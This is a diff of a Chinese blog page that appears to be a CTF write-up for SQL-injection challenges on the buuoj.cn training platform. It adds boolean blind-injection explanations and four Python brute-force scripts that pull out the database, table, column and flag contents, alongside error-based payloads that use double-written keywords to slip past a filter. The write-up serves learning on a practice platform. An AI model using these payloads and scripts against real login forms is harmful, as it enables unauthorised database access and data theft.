@@ -139,7 +139,7 @@ GitHack.py http://www.openssl.org/.git/  scrabble http://example.com/      SQL�
                 Tuesday, Dec 28, 2021
               
 
-            | 1 minutes read
+            | 3 minutes read
 
             | Update at
               
@@ -239,9 +239,110 @@ SQL注入-1
 SQL注入-2
 </h3>
 <div id="outline-text-headline-6" class="outline-text-3">
-<p>看源码发现提示，参数加入 <code class="verbatim">&amp;tips=1</code> 的时候会返回报错信息，是报错注入，如果不加提示就是基于时间的盲注。先来看用提示的。</p>
+<p>看源码发现提示，参数加入 <code class="verbatim">&amp;tips=1</code> 的时候会返回报错信息，是报错注入，如果不加提示就是布尔盲注。先来看用提示的。</p>
 <p>
 随便输入用户名会提示账号不存在，用户名输admin提示账号或密码错误。注入点在用户名。执行 <code class="verbatim">name=admin&#39; and (select extractvalue(1,concat(0x7e,(database()))))--+&amp;pass=123</code> 拿到库名 <code class="verbatim">note</code> ， <code class="verbatim">name=admin&#39; and extractvalue(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema = &#39;note&#39;))--+&amp;pass=123</code> 拿表名。看错误提示猜测 <code class="verbatim">select</code> 被过滤了，用双写 <code class="verbatim">selselectect</code> 替换 <code class="verbatim">select</code> 拿到表名 <code class="verbatim">fl4g</code> 。 <code class="verbatim">name=admin&#39; and (selselectect extractvalue(1,concat(0x7e,(seleselectct group_concat(column_name) from information_schema.columns where table_name = &#39;fl4g&#39;))))--+&amp;pass=123</code> 拿到列名 <code class="verbatim">flag</code> ， <code class="verbatim">name=admin&#39; and(select extractvalue(1,concat(0x7e,(selselectect group_concat(flag) from fl4g))))--+&amp;pass=123</code> 拿到flag。</p>
+<p>
+盲注参考了<a href="https://www.cnblogs.com/xiaochaofang/p/14873459.html">这篇博客</a>。在用户名字段拼接上语句，若后面的语句成功执行，会提示“用户名或密码错误”，否则会提示“找不到用户”。这其实是布尔盲注，能够获得的信息只有真假值。要是连布尔返回值也没有，就只能用时间盲注了，也就是在语句最后连上 <code class="verbatim">or sleep(1)</code> ，根据返回时间判断是否执行，从而转换为布尔盲注。</p>
+<p>
+先测试库名长度 <code class="verbatim">name=1&#39; or length(database())=4#&amp;pass=asdasd</code> ，数字为4的时候返回“用户名或密码错误”，确定库名长度为4。随后用 <code class="verbatim">name=1&#39; or substr(database(),1,1) =&#39;n&#39;#&amp;pass=asdasd</code> 一个一个字符测试库名。之后和前面的注入一样，找表名和列名，输出flag。用下面脚本爆破得到库名</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> time
+
+l <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{&#39;</span>          <span style="color:#75715e">#可能的字符</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://dc879727-d344-4402-aee0-5d997fcf4208.node3.buuoj.cn/login.php&#39;</span>
+sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#39; or substr(database(),</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;#&#34;</span>             <span style="color:#75715e">#构造的注入语句</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">for</span> num <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">5</span>):           <span style="color:#75715e">#根据库名长度进行循环</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> l:
+        data <span style="color:#f92672">=</span> {                <span style="color:#75715e">#构造字典数据</span>
+            <span style="color:#e6db74">&#39;name&#39;</span> : sql <span style="color:#f92672">%</span>(num,i),          <span style="color:#75715e">#把循环变量放入的sql语句中构造完整变化的sql语句</span>
+            <span style="color:#e6db74">&#39;pass&#39;</span> : <span style="color:#e6db74">&#39;asdasd&#39;</span>
+        }
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url <span style="color:#f92672">=</span> url , data<span style="color:#f92672">=</span>data)        <span style="color:#75715e">#对url提交post请求，data为用户名密码数据</span>
+        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)         <span style="color:#75715e">#等待时间</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:     <span style="color:#75715e">#根据回显确定库名</span>
+            flag <span style="color:#f92672">+=</span> i
+            print(<span style="color:#e6db74">&#34;flag:&#34;</span> , flag)
+            <span style="color:#66d9ef">break</span>
+print(<span style="color:#e6db74">&#34;flag:&#34;</span>, flag)</code></pre></div>
+</div>
+<p>
+爆表名</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> time
+l <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{&#39;</span>          <span style="color:#75715e">#可能的字符</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://1b1372ff-b5cb-4f72-98c5-bc9d1f4d321d.node3.buuoj.cn/login.php&#39;</span>
+<span style="color:#75715e">#sql = &#34;1&#39; or substr(database(),%d,1)=&#39;%s&#39;#&#34;             #构造的注入语句</span>
+sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#39; or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;#&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">for</span> num <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>):           <span style="color:#75715e">#根据库名长度进行循环（因为不确定表名长度，我试着写长度稍微大点）</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> l:
+        data <span style="color:#f92672">=</span> {                <span style="color:#75715e">#构造字典数据</span>
+            <span style="color:#e6db74">&#39;name&#39;</span> : sql <span style="color:#f92672">%</span>(num,i),          <span style="color:#75715e">#把循环变量放入的sql语句中构造完整变化的sql语句</span>
+            <span style="color:#e6db74">&#39;pass&#39;</span> : <span style="color:#e6db74">&#39;asdasd&#39;</span>
+        }
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url <span style="color:#f92672">=</span> url , data<span style="color:#f92672">=</span>data)        <span style="color:#75715e">#对url提交post请求，data为用户名密码数据</span>
+        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)         <span style="color:#75715e">#等待时间</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:     <span style="color:#75715e">#根据回显确定库名</span>
+            flag <span style="color:#f92672">+=</span> i
+            print(<span style="color:#e6db74">&#34;flag:&#34;</span> , flag)
+            <span style="color:#66d9ef">break</span>
+print(<span style="color:#e6db74">&#34;flag:&#34;</span>, flag)</code></pre></div>
+</div>
+<p>字段名</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> time
+
+l <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{&#39;</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://8454f388-49f3-4980-962b-7b7781dce053.node3.buuoj.cn/login.php&#39;</span>
+<span style="color:#75715e">#sql = &#34;1&#39; or substr(database(),%d,1)=&#39;%s&#39;#&#34;</span>
+<span style="color:#75715e">#sql = &#34;1&#39; or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=&#39;%s&#39;#&#34;</span>
+sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#39; or substr((seLEct group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;),</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;#&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">for</span> num <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">13</span>):
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> l:
+        data <span style="color:#f92672">=</span> {
+            <span style="color:#e6db74">&#39;name&#39;</span> : sql <span style="color:#f92672">%</span>(num,i),
+            <span style="color:#e6db74">&#39;pass&#39;</span> : <span style="color:#e6db74">&#39;asdasd&#39;</span>
+        }
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url <span style="color:#f92672">=</span> url , data<span style="color:#f92672">=</span>data)
+        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+            flag <span style="color:#f92672">+=</span> i
+            print(<span style="color:#e6db74">&#34;flag:&#34;</span> , flag)
+            <span style="color:#66d9ef">break</span>
+print(<span style="color:#e6db74">&#34;flag:&#34;</span>, flag)</code></pre></div>
+</div>
+<p>flag</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> time
+
+l <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{&#39;</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://8454f388-49f3-4980-962b-7b7781dce053.node3.buuoj.cn/login.php&#39;</span>
+<span style="color:#75715e">#sql = &#34;1&#39; or substr(database(),%d,1)=&#39;%s&#39;#&#34;</span>
+<span style="color:#75715e">#sql = &#34;1&#39; or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=&#39;%s&#39;#&#34;</span>
+<span style="color:#75715e">#sql = &#34;1&#39; or substr((seLEct group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;),%d,1)=&#39;%s&#39;#&#34;</span>
+sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#39; or substr((seLEct flag from fl4g),</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;#&amp;pass=asdasd&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">for</span> num <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">30</span>):
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> l:
+        data <span style="color:#f92672">=</span> {
+            <span style="color:#e6db74">&#39;name&#39;</span> : sql <span style="color:#f92672">%</span>(num,i),
+            <span style="color:#e6db74">&#39;pass&#39;</span> : <span style="color:#e6db74">&#39;asdasd&#39;</span>
+        }
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url <span style="color:#f92672">=</span> url , data<span style="color:#f92672">=</span>data)
+        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+            flag <span style="color:#f92672">+=</span> i
+            print(<span style="color:#e6db74">&#34;flag:&#34;</span> , flag)
+            <span style="color:#66d9ef">break</span>
+print(<span style="color:#e6db74">&#34;flag:&#34;</span>, flag)</code></pre></div>
+</div>
 </div>
 </div>
 </div>
